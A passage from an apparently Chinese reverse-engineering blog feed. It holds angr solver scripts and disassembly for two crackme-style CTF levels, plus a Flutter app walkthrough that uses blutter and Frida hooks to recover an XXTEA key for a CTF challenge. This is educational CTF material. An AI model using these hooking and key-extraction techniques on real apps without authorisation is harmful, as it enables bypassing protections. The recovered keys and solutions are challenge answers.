class="hljs-params">argv</span>):<br>  path_to_binary = <span class="hljs-string">&quot;./13_angr_static_binary&quot;</span><br>  project = angr.Project(path_to_binary)<br><br>  initial_state = project.factory.entry_state(<br>    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;<br>  )<br>  <br>  <span class="hljs-comment"># 里面填写的这些地址是静态链接二进制文件中库函数的入口地址</span><br>  project.hook(<span class="hljs-number">0x0804ed40</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>  project.hook(<span class="hljs-number">0x0804ed80</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>  project.hook(<span class="hljs-number">0x0804f350</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>  project.hook(<span class="hljs-number">0x08048d10</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>  simulation = project.factory.simgr(initial_state)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> stdout_output <br><br>  simulation.explore(find=is_successful, avoid=should_abort)<br>  <br>  <span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/13.1.png"></p><h3 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h3><p>这道题给了一个共享链接库文件，程序中的 validate 函数就是从这个库文件中导入的</p><p><img src="/../images/angr/14.png"></p><p><img src="/../images/angr/14.0.png"></p><p><img src="/../images/angr/14.0.0.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">000106d7</span>    uint32_t validate(char* arg1, int32_t arg2)<br><br><span class="hljs-number">000106d7</span>  <span class="hljs-number">55</span>                 push    ebp &#123;__saved_ebp&#125;<br><span class="hljs-number">000106d8</span>  <span class="hljs-number">89e5</span>               mov     ebp, esp &#123;__saved_ebp&#125;<br><span class="hljs-number">000106</span>da  <span class="hljs-number">56</span>                 push    esi &#123;__saved_esi&#125;<br><span class="hljs-number">000106</span>db  <span class="hljs-number">53</span>                 push    ebx &#123;__saved_ebx&#125;  &#123;_GLOBAL_OFFSET_TABLE_&#125;<br><span class="hljs-number">000106</span>dc  <span class="hljs-number">83</span>ec20             sub     esp, <span class="hljs-number">0</span>x20<br><span class="hljs-number">000106</span>df  e81cfeffff         <span class="hljs-keyword">call</span>    __x86.get_pc_thunk.bx<br><span class="hljs-number">000106e4</span>  <span class="hljs-number">81</span>c31c190000       add     ebx, <span class="hljs-number">0</span>x191c  &#123;_GLOBAL_OFFSET_TABLE_&#125;<br><span class="hljs-number">000106</span>ea  <span class="hljs-number">837d0</span>c07           cmp     dword [ebp+<span class="hljs-number">0</span>xc &#123;arg2&#125;], <span class="hljs-number">0</span>x7<br><span class="hljs-number">000106</span>ee  <span class="hljs-number">7</span>f0a               jg      <span class="hljs-number">0</span>x106fa<br><br><span class="hljs-number">000106</span>f0  b800000000         mov     eax, <span class="hljs-number">0</span>x0<br><span class="hljs-number">000106</span>f5  e983000000         jmp     <span class="hljs-number">0</span>x1077d<br><br><span class="hljs-number">000106</span>fa  c745f400000000     mov     dword [ebp-<span class="hljs-number">0</span>xc &#123;i&#125;], <span class="hljs-number">0</span>x0<br><span class="hljs-symbol">00010701 </span> eb0f               jmp     <span class="hljs-number">0</span>x10712<br><br><span class="hljs-symbol">00010703 </span> <span class="hljs-number">8d55</span>dc             lea     edx, [ebp-<span class="hljs-number">0</span>x24 &#123;var_28&#125;]<br><span class="hljs-symbol">00010706 </span> <span class="hljs-number">8</span>b45f4             mov     eax, dword [ebp-<span class="hljs-number">0</span>xc &#123;i&#125;]<br><span class="hljs-symbol">00010709 </span> <span class="hljs-number">01d0</span>               add     eax, edx &#123;var_28&#125;<br><span class="hljs-number">0001070</span>b  c60000             mov     byte [eax], <span class="hljs-number">0</span>x0<br><span class="hljs-number">0001070</span>e  <span class="hljs-number">8345</span>f401           add     dword [ebp-<span class="hljs-number">0</span>xc &#123;i&#125;], <span class="hljs-number">0</span>x1<br><br><span class="hljs-symbol">00010712 </span> <span class="hljs-number">837</span>df413           cmp     dword [ebp-<span class="hljs-number">0</span>xc &#123;i&#125;], <span class="hljs-number">0</span>x13<br><span class="hljs-symbol">00010716 </span> <span class="hljs-number">7</span>eeb               jle     <span class="hljs-number">0</span>x10703<br><br><span class="hljs-symbol">00010718 </span> <span class="hljs-number">8d45</span>dc             lea     eax, [ebp-<span class="hljs-number">0</span>x24 &#123;var_28&#125;]<br><span class="hljs-number">0001071</span>b  c7005056424c       mov     dword [eax &#123;var_28&#125;], <span class="hljs-number">0</span>x4c425650<br><span class="hljs-symbol">00010721 </span> c7400456544654     mov     dword [eax+<span class="hljs-number">0</span>x4 &#123;var_24&#125;], <span class="hljs-number">0</span>x54465456<br><span class="hljs-symbol">00010728 </span> c745f000000000     mov     dword [ebp-<span class="hljs-number">0</span>x10 &#123;i_1&#125;], <span class="hljs-number">0</span>x0<br><span class="hljs-number">0001072</span>f  eb2c               jmp     <span class="hljs-number">0</span>x1075d<br><br><span class="hljs-symbol">00010731 </span> <span class="hljs-number">8</span>b55f0             mov     edx, dword [ebp-<span class="hljs-number">0</span>x10 &#123;i_1&#125;]<br><span class="hljs-symbol">00010734 </span> <span class="hljs-number">8</span>b4508             mov     eax, dword [ebp+<span class="hljs-number">0</span>x8 &#123;arg1&#125;]<br><span class="hljs-symbol">00010737 </span> <span class="hljs-number">8d3402</span>             lea     esi, [edx+eax]<br><span class="hljs-number">0001073</span>a  <span class="hljs-number">8</span>b55f0             mov     edx, dword [ebp-<span class="hljs-number">0</span>x10 &#123;i_1&#125;]<br><span class="hljs-number">0001073</span>d  <span class="hljs-number">8</span>b4508             mov     eax, dword [ebp+<span class="hljs-number">0</span>x8 &#123;arg1&#125;]<br><span class="hljs-symbol">00010740 </span> <span class="hljs-number">01d0</span>               add     eax, edx<br><span class="hljs-symbol">00010742 </span> <span class="hljs-number">0</span>fb600             movzx   eax, byte [eax]<br><span class="hljs-symbol">00010745 </span> <span class="hljs-number">0</span>fbec0             movsx   eax, al<br><span class="hljs-symbol">00010748 </span> <span class="hljs-number">83</span>ec08             sub     esp, <span class="hljs-number">0</span>x8<br><span class="hljs-number">0001074</span>b  ff75f0             push    dword [ebp-<span class="hljs-number">0</span>x10 &#123;i_1&#125;] &#123;var_38_1&#125;<br><span class="hljs-number">0001074</span>e  <span class="hljs-number">50</span>                 push    eax &#123;var_3c_1&#125;<br><span class="hljs-number">0001074</span>f  e86cfdffff         <span class="hljs-keyword">call</span>    complex_function<br><span class="hljs-symbol">00010754 </span> <span class="hljs-number">83</span>c410             add     esp, <span class="hljs-number">0</span>x10<br><span class="hljs-symbol">00010757 </span> <span class="hljs-number">8806</span>               mov     byte [esi], al<br><span class="hljs-symbol">00010759 </span> <span class="hljs-number">8345</span>f001           add     dword [ebp-<span class="hljs-number">0</span>x10 &#123;i_1&#125;], <span class="hljs-number">0</span>x1<br><br><span class="hljs-number">0001075</span>d  <span class="hljs-number">837</span>df007           cmp     dword [ebp-<span class="hljs-number">0</span>x10 &#123;i_1&#125;], <span class="hljs-number">0</span>x7<br><span class="hljs-symbol">00010761 </span> <span class="hljs-number">7</span>ece               jle     <span class="hljs-number">0</span>x10731<br><br><span class="hljs-symbol">00010763 </span> <span class="hljs-number">83</span>ec08             sub     esp, <span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00010766 </span> <span class="hljs-number">8d45</span>dc             lea     eax, [ebp-<span class="hljs-number">0</span>x24 &#123;var_28&#125;]<br><span class="hljs-symbol">00010769 </span> <span class="hljs-number">50</span>                 push    eax &#123;var_28&#125; &#123;var_38_2&#125;<br><span class="hljs-number">0001076</span>a  ff7508             push    dword [ebp+<span class="hljs-number">0</span>x8 &#123;arg1&#125;] &#123;var_3c_2&#125;<br><span class="hljs-number">0001076</span>d  e82efdffff         <span class="hljs-keyword">call</span>    strcmp<br><span class="hljs-symbol">00010772 </span> <span class="hljs-number">83</span>c410             add     esp, <span class="hljs-number">0</span>x10<br><span class="hljs-symbol">00010775 </span> <span class="hljs-number">85</span>c0               test    eax, eax<br><span class="hljs-symbol">00010777 </span> <span class="hljs-number">0</span>f94c0             sete    al<br><span class="hljs-number">0001077</span>a  <span class="hljs-number">0</span>fb6c0             movzx   eax, al<br><br><span class="hljs-number">0001077</span>d  <span class="hljs-number">8d65</span>f8             lea     esp, [ebp-<span class="hljs-number">0</span>x8]<br><span class="hljs-symbol">00010780 </span> <span class="hljs-number">5</span>b                 pop     ebx &#123;__saved_ebx&#125;<br><span class="hljs-symbol">00010781 </span> <span class="hljs-number">5</span>e                 pop     esi &#123;__saved_esi&#125;<br><span class="hljs-symbol">00010782 </span> <span class="hljs-number">5</span>d                 pop     ebp &#123;__saved_ebp&#125;<br><span class="hljs-symbol">00010783 </span> c3                 retn     &#123;__return_addr&#125;<br></code></pre></td></tr></table></figure><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    <span class="hljs-comment"># 注意这里填的是共享库文件，而不是调用这个库的可执行文件</span><br>    path_to_binary = <span class="hljs-string">&quot;./lib14_angr_shared_library.so&quot;</span><br>    base = <span class="hljs-number">0x10000</span><br>    project = angr.Project(path_to_binary, load_options=&#123; <br>        <span class="hljs-string">&#x27;main_opts&#x27;</span> : &#123; <br>            <span class="hljs-string">&#x27;base_addr&#x27;</span> : base <br>        &#125; <br>  &#125;)<br>    <span class="hljs-comment"># 设置符号输入缓冲区地址,这个地址将作为 validate 函数的第一个参数传入，代表 char *buffer</span><br>    buffer_pointer = claripy.BVV(<span class="hljs-number">0x3000000</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32 位架构指针占用 32 字节</span><br><br>    <span class="hljs-comment"># 构造初始符号执行状态（call_state)</span><br>    validate_function_address = base + <span class="hljs-number">0x6d7</span><br><br>    initial_state = project.factory.call_state(<br>        validate_function_address,<br>        buffer_pointer,<br>        claripy.BVV(<span class="hljs-number">8</span>, <span class="hljs-number">32</span>),<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;)<br>    <br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span>*<span class="hljs-number">8</span>) <br>    initial_state.memory.store(buffer_pointer, password)<br>    simulation = project.factory.simgr(initial_state)<br><br>    check_constraint_addres = base + <span class="hljs-number">0x77d</span> <span class="hljs-comment"># 该地址处在函数返回之前，返回值（eax）已经确定</span><br>    simulation.explore(find=check_constraint_addres)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        solution_state.add_constraints(solution_state.regs.eax != <span class="hljs-number">0</span>)<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password,cast_to=<span class="hljs-built_in">bytes</span>).decode()<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/14.1.png"></p><p>参考文章：<br><a href="https://github.com/jakespringer/angr_ctf/tree/master/solutions">https://github.com/jakespringer/angr_ctf/tree/master/solutions</a><br><a href="https://3cly.github.io/2023/04/16/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://3cly.github.io/2023/04/16/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://www.kn0sky.com/?p=0e2f9462-df20-4705-83c2-4ff36b5b0c40#angr-%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0">https://www.kn0sky.com/?p=0e2f9462-df20-4705-83c2-4ff36b5b0c40#angr-%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flutter 逆向</title>
    <link href="/2025/09/23/flutter/"/>
    <url>/2025/09/23/flutter/</url>
    
    <content type="html"><![CDATA[<h3 id="NewStar-2024-Week5-Ohn-flutter"><a href="#NewStar-2024-Week5-Ohn-flutter" class="headerlink" title="[NewStar 2024 Week5] Ohn_flutter!!!"></a>[NewStar 2024 Week5] Ohn_flutter!!!</h3><p>java 层看到密文<br><img src="/../images/flutter/cipher.png"></p><p>使用 blutter 恢复 libapp.so 的符号<br>先克隆 blutter 项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/worawit/blutter --depth=1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\aaa\flutter\blutter&gt;python -m pip install pyelftools<br>D:\aaa\flutter\blutter&gt;python blutter.py ..\ns24\ .\output<br></code></pre></td></tr></table></figure><p>ns24 目录中存放着已经提取出来的 so 文件，在 blutter 目录下找到刚刚新生成的 output 文件夹<br>找到里面的 <code>ida_script\addNames.py</code>,在 ida 8.3 中(ida 9.0 的 api 改变了，使用这个脚本会有报错，不能完全恢复)用这个脚本恢复 so 文件的符号，由于我 8.3 的 ida 没法反编译 arm，所以把把这个保存成 i64，然后选择 bn 中的 Analysis -&gt; Import Debug Info from External File 导入 i64 文件，即可在 bn 中看到还原了函数名的 so 文件</p><p>搜索 <code>ohn_flutter</code> 查找关键函数</p><p><img src="/../images/flutter/ns2.png"></p><p>用 blutter 里面的 blutter_frida.js 脚本 hook 函数的参数</p><p><img src="/../images/flutter/ns1.png"></p><p><code>ohn_flutter$drink_drink::_fixkey_2fea14</code></p><p>得到 key <code>111,104,110,95,102,108,117,116,116,101,114,107,107,107,107,107</code></p><p>hook  <code>ohn_flutter$doi_::jumppp_2fe3c8</code>的参数也能得到 key 为 <code>ohn_flutterkkkkk</code></p><p><img src="/../images/flutter/ns3.png"></p><p>点进 <code>ohn_flutter$doi_::jumppp_2fe3c8 -&gt; ohn_flutter$drink_drink::ens_2fe410 -&gt; ohn_flutter$drink_drink::encrypt_2fe460 </code></p><p>里面有不少有用的函数如最开始 hook 过的 <code>ohn_flutter$drink_drink::_fixkey_2fea14</code></p><p>hook <code>ohn_flutter$drink_drink::_encryptUint32List_2fe5ec</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">_Uint32List@<span class="hljs-number">730017d</span>e19 = [<br>  <span class="hljs-number">1601071215</span>,<br>  <span class="hljs-number">1953852518</span>,<br>  <span class="hljs-number">1802659188</span>,<br>  <span class="hljs-number">1802201963</span><br>]<br></code></pre></td></tr></table></figure><p>仔细看这个函数，发现了很多 <strong>xxtea</strong> 的特征<br>DELTA &#x3D; 0x9E3779B9</p><p><img src="/../images/flutter/xxtea1.png"></p><p>rounds &#x3D; 6 + 52 &#x2F; n </p><p>函数的开头可以看到定义 x2 &#x3D; 0x34(52)</p><p><img src="/../images/flutter/xxtea3.png"></p><p>MX &#x3D; ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))</p><p><img src="/../images/flutter/xxtea2.png"></p><p>然后往前交叉引用<br>hook <code>dart_convert_Codec::encode_2d5178</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">_Uint8List@<span class="hljs-number">7300131939</span> = [<span class="hljs-number">0,44,116,172</span>,<span class="hljs-number">168,123,57,249</span>]<br>_Uint8List@<span class="hljs-number">730013</span>b8e9 = [<span class="hljs-number">115,125,141,220</span>,<span class="hljs-number">54,187,239,62</span>,<span class="hljs-number">180,24,73,101</span>,<span class="hljs-number">254,58,44,214</span>]<br></code></pre></td></tr></table></figure><p>点进这个函数，看到有个 base64 <code>dart_convert_Base64Encoder::convert_409c50</code> </p><p>到这里这条线的函数差不多就看完了<br>再回到开始的地方</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">ohn_flutter<span class="hljs-variable">$EditView_MyEditTextState</span>::_anon_closure_2d4f08 -&gt; encrypt<span class="hljs-variable">$encrypt_Encrypted</span>::ctor_fromUtf8_2fe1c4 -&gt; dart_convert_Utf8Encoder::convert_40b1a8<br></code></pre></td></tr></table></figure><p>hook <code>dart_convert_Utf8Encoder::convert_40b1a8</code></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">String</span>@<span class="hljs-number">730078e5</span>b9 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.setClient<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:[1,&#123;<span class="hljs-char escape_">\&quot;</span>inputType<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>name<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInputType.text<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>signed<span class="hljs-char escape_">\&quot;</span>:null,<span class="hljs-char escape_">\&quot;</span>decimal<span class="hljs-char escape_">\&quot;</span>:null&#125;,<span class="hljs-char escape_">\&quot;</span>readOnly<span class="hljs-char escape_">\&quot;</span>:false,<span class="hljs-char escape_">\&quot;</span>obscureText<span class="hljs-char escape_">\&quot;</span>:false,<span class="hljs-char escape_">\&quot;</span>autocorrect<span class="hljs-char escape_">\&quot;</span>:true,<span class="hljs-char escape_">\&quot;</span>smartDashesType<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>1<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>smartQuotesType<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>1<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>enableSuggestions<span class="hljs-char escape_">\&quot;</span>:true,<span class="hljs-char escape_">\&quot;</span>enableInteractiveSelection<span class="hljs-char escape_">\&quot;</span>:true,<span class="hljs-char escape_">\&quot;</span>actionLabel<span class="hljs-char escape_">\&quot;</span>:null,<span class="hljs-char escape_">\&quot;</span>inputAction<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInputAction.done<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>textCapitalization<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextCapitalization.none<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>keyboardAppearance<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>Brightness.light<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>enableIMEPersonalizedLearning<span class="hljs-char escape_">\&quot;</span>:true,<span class="hljs-char escape_">\&quot;</span>contentCommitMimeTypes<span class="hljs-char escape_">\&quot;</span>:[],<span class="hljs-char escape_">\&quot;</span>autofill<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>uniqueIdentifier<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>EditableText-28050040<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>hints<span class="hljs-char escape_">\&quot;</span>:[],<span class="hljs-char escape_">\&quot;</span>editingValue<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>text<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>selectionBase<span class="hljs-char escape_">\&quot;</span>:0,<span class="hljs-char escape_">\&quot;</span>selectionExtent<span class="hljs-char escape_">\&quot;</span>:0,<span class="hljs-char escape_">\&quot;</span>selectionAffinity<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextAffinity.downstream<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>selectionIsDirectional<span class="hljs-char escape_">\&quot;</span>:false,<span class="hljs-char escape_">\&quot;</span>composingBase<span class="hljs-char escape_">\&quot;</span>:-1,<span class="hljs-char escape_">\&quot;</span>composingExtent<span class="hljs-char escape_">\&quot;</span>:-1&#125;,<span class="hljs-char escape_">\&quot;</span>hintText<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>Fill flag here and Press enter...<span class="hljs-char escape_">\&quot;</span>&#125;,<span class="hljs-char escape_">\&quot;</span>enableDeltaModel<span class="hljs-char escape_">\&quot;</span>:false&#125;]&#125;&quot;</span>        <br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300790499</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.setEditableSizeAndTransform<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>width<span class="hljs-char escape_">\&quot;</span>:372.72727272727275,<span class="hljs-char escape_">\&quot;</span>height<span class="hljs-char escape_">\&quot;</span>:24.0,<span class="hljs-char escape_">\&quot;</span>transform<span class="hljs-char escape_">\&quot;</span>:[1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,105.63636363636364,0.0,1.0]&#125;&#125;&quot;</span>  <br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300791709</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.setMarkedTextRect<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>width<span class="hljs-char escape_">\&quot;</span>:2.0,<span class="hljs-char escape_">\&quot;</span>height<span class="hljs-char escape_">\&quot;</span>:24.0,<span class="hljs-char escape_">\&quot;</span>x<span class="hljs-char escape_">\&quot;</span>:0.18181818181818166,<span class="hljs-char escape_">\&quot;</span>y<span class="hljs-char escape_">\&quot;</span>:0.18181818181818699&#125;&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300792309</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.setStyle<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>fontFamily<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>Roboto<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>fontSize<span class="hljs-char escape_">\&quot;</span>:16.0,<span class="hljs-char escape_">\&quot;</span>fontWeightIndex<span class="hljs-char escape_">\&quot;</span>:3,<span class="hljs-char escape_">\&quot;</span>textAlignIndex<span class="hljs-char escape_">\&quot;</span>:4,<span class="hljs-char escape_">\&quot;</span>textDirectionIndex<span class="hljs-char escape_">\&quot;</span>:1&#125;&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300792</span>f59 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.setEditingState<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>text<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char 